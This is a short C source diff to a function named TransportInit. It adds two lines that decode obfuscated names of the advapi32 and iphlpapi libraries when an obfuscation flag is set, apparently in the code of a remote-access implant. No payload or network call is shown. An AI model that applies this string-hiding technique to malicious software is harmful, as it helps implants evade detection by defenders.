@@ -272,6 +272,9 @@ BOOL TransportInit( ) {
     }
 
 #if CONFIG_OBFUSCATION == TRUE
+    PWCHAR pwcAdvapi32 = str_to_wide(d_advapi32);
+    PWCHAR pwcIphlpapi = str_to_wide(d_iphlpapi);
+
     if(pwcAdvapi32 != NULL){
         INT lenWAdvapi32 = lstrlenW(pwcAdvapi32);
         DATA_FREE(pwcAdvapi32,lenWAdvapi32)
